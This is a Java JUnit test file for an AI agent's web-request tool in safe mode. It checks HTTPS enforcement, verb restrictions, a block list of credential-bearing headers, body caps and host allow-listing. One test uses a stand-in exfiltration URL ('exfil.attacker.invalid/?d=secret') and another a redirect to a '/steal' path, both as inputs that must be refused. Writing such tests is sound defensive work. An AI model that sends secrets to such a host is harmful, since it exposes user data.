package com.agenticai.core.agents.tools.web;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** {@link HttpRequestExecutor} safe mode: scheme, methods, headers, bodies and the allow-list. */
class HttpRequestExecutorSafeModeRequestShapeTest extends HttpRequestExecutorSafeModeTestSupport {

    // ------------------------------------------------------------------ scheme

    @Test
    void plainHttpIsRefusedByDefaultAndAllowedOnlyWhenConfigured() {
        RecordingExecutor executor = new RecordingExecutor(null);
        assertThrows(
                WebPageFetchException.class,
                () ->
                        executor.executeSafe(
                                HttpRequestSpec.get("http://" + HOST + "/"),
                                "u1",
                                readPolicy(),
                                null));
        assertTrue(executor.sent.isEmpty());

        executor.responses.add(json("{}"));
        HttpRequestPolicy insecure =
                policy(HttpRequestSafetyConfig.READ_METHODS, true, List.of(), List.of());
        assertEquals(
                200,
                executor.executeSafe(
                                HttpRequestSpec.get("http://" + HOST + "/"), "u1", insecure, null)
                        .status());
    }

    // ------------------------------------------------------------------ methods, headers, bodies

    @Test
    void theReadToolRefusesStateChangingVerbsAndTheWriteToolRefusesReads() {
        RecordingExecutor executor = new RecordingExecutor(null);
        WebPageFetchException post =
                assertThrows(
                        WebPageFetchException.class,
                        () ->
                                executor.executeSafe(
                                        spec("POST", "https://" + HOST + "/", Map.of(), "{}"),
                                        "u1",
                                        readPolicy(),
                                        null));
        assertTrue(
                post.getMessage().contains("POST") && post.getMessage().contains("GET"),
                post.getMessage());
        assertThrows(
                WebPageFetchException.class,
                () ->
                        executor.executeSafe(
                                HttpRequestSpec.get("https://" + HOST + "/"),
                                "u1",
                                writePolicy(),
                                null));
        assertTrue(executor.sent.isEmpty());
    }

    @Test
    void credentialBearingAndProxyHeadersCannotBeSetDirectly() {
        RecordingExecutor executor = new RecordingExecutor(null);
        for (String header :
                List.of(
                        "Authorization",
                        "authorization",
                        "COOKIE",
                        "X-Api-Key",
                        "Proxy-Authorization",
                        "Host",
                        "Content-Length")) {
            WebPageFetchException e =
                    assertThrows(
                            WebPageFetchException.class,
                            () ->
                                    executor.executeSafe(
                                            spec(
                                                    "GET",
                                                    "https://" + HOST + "/",
                                                    Map.of(header, "Bearer abc"),
                                                    null),
                                            "u1",
                                            readPolicy(),
                                            null),
                            header);
            assertFalse(
                    e.getMessage().contains("Bearer abc"), "the offending value is never echoed");
        }
        assertTrue(executor.sent.isEmpty());
    }

    @Test
    void ordinaryHeadersAreForwarded() {
        RecordingExecutor executor = new RecordingExecutor(null);
        executor.responses.add(json("{\"ok\":true}"));

        executor.executeSafe(
                spec("GET", "https://" + HOST + "/x", Map.of("X-Request-Id", "r-1"), null),
                "u1",
                readPolicy(),
                null);

        assertEquals("r-1", executor.sent.get(0).header("x-request-id"));
        assertNull(executor.sent.get(0).header("authorization"));
    }

    @Test
    void requestBodiesAreCappedAndForbiddenOnReads() {
        RecordingExecutor executor = new RecordingExecutor(null);
        String huge = "x".repeat(2_000);
        WebPageFetchException tooBig =
                assertThrows(
                        WebPageFetchException.class,
                        () ->
                                executor.executeSafe(
                                        spec("POST", "https://" + HOST + "/", Map.of(), huge),
                                        "u1",
                                        writePolicy(),
                                        null));
        assertTrue(tooBig.getMessage().contains("1024"), tooBig.getMessage());
        assertThrows(
                WebPageFetchException.class,
                () ->
                        executor.executeSafe(
                                spec("GET", "https://" + HOST + "/", Map.of(), "{}"),
                                "u1",
                                readPolicy(),
                                null));
        assertTrue(executor.sent.isEmpty());
    }

    @Test
    void requestContentTypeMustBeOnTheAllowList() {
        RecordingExecutor executor = new RecordingExecutor(null);
        assertThrows(
                WebPageFetchException.class,
                () ->
                        executor.executeSafe(
                                spec(
                                        "POST",
                                        "https://" + HOST + "/",
                                        Map.of("Content-Type", "application/x-msdownload"),
                                        "{}"),
                                "u1",
                                writePolicy(),
                                null));
        executor.responses.add(json("{}"));
        executor.executeSafe(
                spec(
                        "POST",
                        "https://" + HOST + "/",
                        Map.of("content-type", "application/json; charset=utf-8"),
                        "{\"a\":1}"),
                "u1",
                writePolicy(),
                null);
        assertEquals("{\"a\":1}", executor.sent.get(0).body());
    }

    @Test
    void aJsonBodyGetsAJsonContentTypeByDefault() {
        RecordingExecutor executor = new RecordingExecutor(null);
        executor.responses.add(json("{}"));
        executor.executeSafe(
                spec("POST", "https://" + HOST + "/", Map.of(), "{\"a\":1}"),
                "u1",
                writePolicy(),
                null);
        assertEquals("application/json", executor.sent.get(0).header("content-type"));
    }

    // ------------------------------------------------------------------ allow-list

    @Test
    void aHostOffTheAllowListIsRefusedBeforeAnyDnsLookup() {
        RecordingExecutor executor = new RecordingExecutor(null);
        HttpRequestPolicy listed =
                policy(HttpRequestSafetyConfig.READ_METHODS, false, List.of(), List.of(HOST));

        // ".invalid" can never resolve: reaching DNS first would produce "could not be resolved"
        // instead.
        WebPageFetchException e =
                assertThrows(
                        WebPageFetchException.class,
                        () ->
                                executor.executeSafe(
                                        HttpRequestSpec.get(
                                                "https://exfil.attacker.invalid/?d=secret"),
                                        "u1",
                                        listed,
                                        null));

        assertTrue(e.getMessage().contains("allowed hosts"), e.getMessage());
        assertTrue(executor.sent.isEmpty());
    }

    @Test
    void anAllowListedHostIsReachableAndARedirectOffTheListIsRefused() {
        RecordingExecutor executor = new RecordingExecutor(null);
        HttpRequestPolicy listed =
                policy(HttpRequestSafetyConfig.READ_METHODS, false, List.of(), List.of(HOST));
        executor.responses.add(json("{\"ok\":1}"));
        assertEquals(
                200,
                executor.executeSafe(
                                HttpRequestSpec.get("https://" + HOST + "/"), "u1", listed, null)
                        .status());

        executor.sent.clear();
        executor.responses.add(redirect(302, "https://" + OTHER_HOST + "/steal"));
        WebPageFetchException e =
                assertThrows(
                        WebPageFetchException.class,
                        () ->
                                executor.executeSafe(
                                        HttpRequestSpec.get("https://" + HOST + "/"),
                                        "u1",
                                        listed,
                                        null));
        assertTrue(e.getMessage().contains("allowed hosts"), e.getMessage());
        assertEquals(1, executor.sent.size(), "the off-list redirect target is never requested");
    }

    @Test
    void theOperatorListIsACeilingThatAnAgentListCannotWiden() {
        RecordingExecutor executor = new RecordingExecutor(null);
        HttpRequestPolicy both =
                policy(
                        HttpRequestSafetyConfig.READ_METHODS,
                        false,
                        List.of(HOST),
                        List.of(HOST, OTHER_HOST));
        assertThrows(
                WebPageFetchException.class,
                () ->
                        executor.executeSafe(
                                HttpRequestSpec.get("https://" + OTHER_HOST + "/"),
                                "u1",
                                both,
                                null));
        assertTrue(executor.sent.isEmpty());
    }
}
